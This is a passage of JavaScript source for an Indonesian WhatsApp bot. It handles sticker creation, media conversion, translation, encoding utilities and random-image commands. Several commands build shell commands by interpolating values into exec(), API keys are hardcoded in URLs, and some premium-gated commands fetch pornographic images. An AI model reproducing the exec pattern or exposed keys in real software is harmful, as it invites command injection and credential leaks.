if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (args.length < 2) return textImg(`Penggunaan ${command} nama|author`)
gameAdd(sender, glimit)
let packname1 = q.split('|')[0] ? q.split('|')[0] : q
let author1 = q.split('|')[1] ? q.split('|')[1] : ''
if (isImage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let media = await surya.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
exif.create(packname1, author1, `stickwm_${sender}`)
await ffmpeg(`${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(mess.error.api)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error.api)
surya.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else if ((isVideo && msg.message.videoMessage.fileLength < 10000000 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let media = await surya.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
exif.create(packname1, author1, `stickwm_${sender}`)
Flink(mess.wait)
await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(mess.error.api)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error.api)
surya.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else if (isQuotedSticker) {
let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media = await surya.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
exif.create(packname1, author1, `takestick_${sender}`)
exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error.api)
surya.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
})
}else {
textImg(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim
Note : Durasi video maximal 10 detik`)
}
}
break
case 'toimg': case 'img': case 'tomedia':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!isQuotedSticker) return reply('Reply stiker nya')
let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media = await surya.downloadAndSaveMediaMessage(encmedia)
if (quotedMsg.stickerMessage.isAnimated === true){
reply(`Blum support sticker gif :/`)
} else {
//Flink(mess.wait)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(mess.error.api)
surya.sendMessage(from, fs.readFileSync(ran), image, {quoted: msg, caption: `Nih ${pushname}`})
limitAdd(sender,limit)
fs.unlinkSync(ran)
})
}
}
break
case 'attp':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Kirim perintah *${prefix}attp* teks`)
let ane = await getBuffer(`https://api.xteam.xyz/attp?file&text=${q}`)
fs.writeFileSync('./sticker/attp.webp', ane)
exec(`webpmux -set exif ./sticker/data.exif ./sticker/attp.webp -o ./sticker/attp.webp`, async (error) => {
if (error) return reply(mess.error.api)
surya.sendMessage(from, fs.readFileSync(`./sticker/attp.webp`), sticker, {quoted: msg})
limitAdd(sender, limit)
fs.unlinkSync(`./sticker/attp.webp`)
})
}
break
case 'colong': case 'take': case 'curi': case 'copas': case 'maling': case 'ambil':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
gameAdd(sender, glimit)
let packname1 = `Dan Allah mengetahui apa yang (tersimpan) dalam hatimu (QS. Al Ahzab 33:51)\nCreated By Mecha Botz - Stah Surya\n62895415497664`
let author1 = `\n\n\n\n\n\n\n\n\n\n\n\n`
if (isImage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let media = await surya.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
exif.create(packname1, author1, `stickwm_${sender}`)
await ffmpeg(`${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(mess.error.api)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error.api)
surya.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else if ((isVideo && msg.message.videoMessage.fileLength < 10000000 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let media = await surya.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
exif.create(packname1, author1, `stickwm_${sender}`)
Flink(mess.wait)
await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(mess.error.api)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error.api)
surya.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else if (isQuotedSticker) {
let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media = await surya.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
exif.create(packname1, author1, `takestick_${sender}`)
exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error.api)
surya.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
})
}else {
textImg(`Tag stiker yang sudah dikirim dengan caption Ambil`)
}
}
break
case 'toimg':
case 'tomedia':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!isQuotedSticker) return reply('Reply stiker nya')
let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media = await surya.downloadAndSaveMediaMessage(encmedia)
if (quotedMsg.stickerMessage.isAnimated === true){
textImg(`Blum support sticker gif :/`)
} else {
Flink(mess.wait)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('Gagal :V')
surya.sendMessage(from, fs.readFileSync(ran), image, {quoted: msg, caption: `Nih *${pushname}*`})
limitAdd(sender,limit)
fs.unlinkSync(ran)
})
}
}
break
case 'translate': case 'tr':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan :
*${prefix}translate* kodebahasa teks
*${prefix}translate* kodebahasa [reply message]`)
if (isQuotedMsg){
let bahasanya = args[1].toString()
const trans = await translate(quotedMsg.chats, {
to: bahasanya
})
.then((res) => reply(res.text))
.catch((err) => {
reply(bahasalist())
})
trans
limitAdd(sender, limit)
} else {
if (args.length < 3) return textImg(`Penggunaan :
*${prefix}translate* kodebahasa teks
*${prefix}translate* kodebahasa <reply message>`)
let bahasanya = args[1].toString()
let textnya = q.slice(args[1].length + 1, q.length)
const trans = await translate(textnya, {
to: bahasanya
})
.then((res) => reply(res.text))
.catch((err) => {
reply(bahasalist())
})
trans
limitAdd(sender, limit)
}
}
break
case 'tinyurl':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan :\n*${prefix}tinyurl link`)
                if (!isUrl(args[1])) return reply(`Masukkan link yang benar`)
                axios.get(`https://tinyurl.com/api-create.php?url=${args[1]}`)
                .then((a) => reply(`Nih ${a.data}`))
                .catch(() => reply(`Error, harap masukkan link dengan benar`))
                break
            case 'imgtourl':{
                if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
                    let media = await surya.downloadMediaMessage(encmedia)
                    let toBase64 = media.toString('base64')
                    let upload = await require("../lib/upToTuru")(toBase64)
                    await reply(`${upload.image.image.url}`)
                    limitAdd(sender, limit)
                } else {
                    reply(`Kirim gambar atau reply gambar dengan caption ${command}`)
                }
            }
                break
//------------------< NULIS >---------------------
case 'nulis':{
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return reply(`Kirim perintah *${prefix}nulis* teks`)
Flink(mess.wait)
sendFileFromUrl(from, `https://api.zeks.xyz/api/nulis?apikey=apivinz&text=${q}`, 'Jangan mager kak:v', msg)
.catch(() => reply(mess.error.api))
}
break

case 'hex6': case 'ebase64':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if(!isOwner && !isPremium && !fromMe && !isOwner2) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (q.length > 2048) return reply('Maximal 2.048 String!')
if (isQuotedMsg){
textImg(Buffer.from(quotedMsg.chats).toString('base64'))
limitAdd(sender, limit)
} else {
if (!q) return reply(`Format salah!\n\nKirim perintah: ${prefix}ebase64 *text*\nContoh: ${prefix}ebase64 Yaudah Iya`)
if (q.length > 2048) return reply('Maximal 2.048 String!')
textImg(Buffer.from(q).toString('base64'))
gameAdd(sender, glimit)
}
break

case 'hex4': case 'debase64':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if(!isOwner && !isPremium && !fromMe && !isOwner2) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (q.length > 2048) return reply('Maximal 2.048 String!')
if (isQuotedMsg){
textImg(Buffer.from(quotedMsg.chats, 'base64').toString('ascii'))
limitAdd(sender, limit)
} else {
if (!q) return reply(`Format salah!\n\nKirim perintah: ${prefix}debase64 *encrypt base64*\nContoh: ${prefix}debase64 RGFobGFoIHRlcnNlcmFoIGthbGlhbg==`)
if (q.length > 2048) return reply('Maximal 2.048 String!')
textImg(Buffer.from(q, 'base64').toString('ascii'))
limitAdd(sender, limit)
}
break

case 'ehex':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (q.length > 2048) return reply('Maximal 2.048 String!')
var convertHex = require('amrhextotext')
if (isQuotedMsg){
let Surya = await convertHex.textToHex(quotedMsg.chats)
textImg(Surya)
gameAdd(sender, glimit)
} else {
if (!q) return reply(`Format salah!\n\nKirim perintah: ${prefix}dehex *[encript hex]*\nContoh: ${prefix}dehex 5375727961`)
if (q.length > 2048) return reply('Maximal 2.048 String!')
var convertHex = require('amrhextotext')
textImg(convertHex.textToHex(q))
gameAdd(sender, glimit)
}
break

case 'dehex':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (q.length > 2048) return reply('Maximal 2.048 String!')
var convertHex = require('amrhextotext')
if (isQuotedMsg){
let Surya = await convertHex.hexToUtf8(quotedMsg.chats)
textImg(Surya)
gameAdd(sender, glimit)
} else {
if (!q) return reply(`Format salah!\n\nKirim perintah: ${prefix}dehex *[encript hex]*\nContoh: ${prefix}dehex 5375727961`)
if (q.length > 2048) return reply('Maximal 2.048 String!')
var convertHex = require('amrhextotext')
textImg(convertHex.hexToUtf8(q))
}
break

case 'hex2':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium && !isOwner) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (q.length > 2048) return reply('Maximal 2.048 String!')
if (isQuotedMsg){
function encodeBinary(char) {
return char.split("").map(str => {
const converted = str.charCodeAt(0).toString(2);
return converted.padStart(8, "0");
}).join(" ")
}
let rya = await encodeBinary(quotedMsg.chats)
textImg(rya)
gameAdd(sender, glimit)
} else {
if (!q) return reply(`Teksnya mana su?`)
if (q.length > 2048) return reply('Maximal 2.048 String!')
function encodeBinary(char) {
return char.split("").map(str => {
const converted = str.charCodeAt(0).toString(2);
return converted.padStart(8, "0");
}).join(" ")
}
textImg(encodeBinary(q))
gameAdd(sender, glimit)
}
break

case 'hex1':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium && !isOwner) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (q.length > 2048) return reply('Maximal 2.048 String!')
if (isQuotedMsg){
function decodebinary(char) {
return char.split(" ").map(str => String.fromCharCode(Number.parseInt(str, 2))).join("");
}
let sur = await decodebinary(quotedMsg.chats)
textImg(sur)
gameAdd(sender, glimit)
} else {
if (!q) return reply(`Penggunaan :

*${prefix}debinary* teks
contoh :
*${prefix}debinary* 01110011 01110101 01110010 01111001 01100001
atau
*${prefix}debinary* [reply pesan]`)
if (q.length > 2048) return reply('Maximal 2.048 String!')
function decodebinary(char) {
return char.split(" ").map(str => String.fromCharCode(Number.parseInt(str, 2))).join("");
}
textImg(decodebinary(q))
gameAdd(sender, glimit)
}
break

case 'ppcouple':case 'ppc':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
textImg(mess.wait)
let hmm = await fetchJson(`https://dapuhy-api.herokuapp.com/api/randomimage/couple?apikey=ItsMeKo`) 
let cowo = await getBuffer(hmm.result.pria)
surya.sendMessage(from, cowo, image, {quoted: msg, caption: `*COWO*`})
let cewe = await getBuffer(hmm.result.wanita)
surya.sendMessage(from, cewe, image, {quoted: msg, caption: `*CEWE*`})
await sleep(3000)
const PPcouple = [{buttonId: 'ppcouple', buttonText: {displayText: 'NEXT'}, type: 1}]
const PPcoupleMessage = {
contentText: `Click Next Untuk Ke Gambar Selanjutnya!`,
//footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: PPcouple,
headerType: 1
}
surya.sendMessage(from, PPcoupleMessage, MessageType.buttonsMessage, {
contextInfo: {mentionedJid: [Suryaa, sender], msg}})
limitAdd(sender)
break 

case 'quotesimage':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`http://api.lolhuman.xyz/api/random/quotesimage?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'ppestetik':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/random/estetic?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'hentai2':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/random2/random_hentai_gif?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
gameAdd(sender, glimit)
break
case 'randomwallpaper': case 'randomwall':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/random2/wallpaper?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'blowjob':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/random2/blowjob?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
gameAdd(sender, glimit)
break
case 'darkjoke':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
gameAdd(sender, glimit)
break

case 'missionpassed': case 'mpr':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/gtapassed?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'meme8':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
sendFileFromUrl(from, `https://api.lolhuman.xyz/api/meme8?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`, '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'meme7':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
sendFileFromUrl(from, `https://api.lolhuman.xyz/api/meme7?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`, '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'meme2':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
sendFileFromUrl(from, `https://api.lolhuman.xyz/api/meme2?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`, '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'meme3':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 3) return textImg(`Penggunaan ${command} text1|text2|text3`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2|text3`)
Flink(mess.wait)
sendFileFromUrl(from, `https://api.lolhuman.xyz/api/meme3?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}&text3=${q.split("|")[2]}`, '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'meme6':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 3) return textImg(`Penggunaan ${command} text1|text2|text3`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2|text3`)
Flink(mess.wait)
sendFileFromUrl(from, `https://api.lolhuman.xyz/api/meme6?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}&text3=${q.split("|")[2]}`, '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'meme5':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
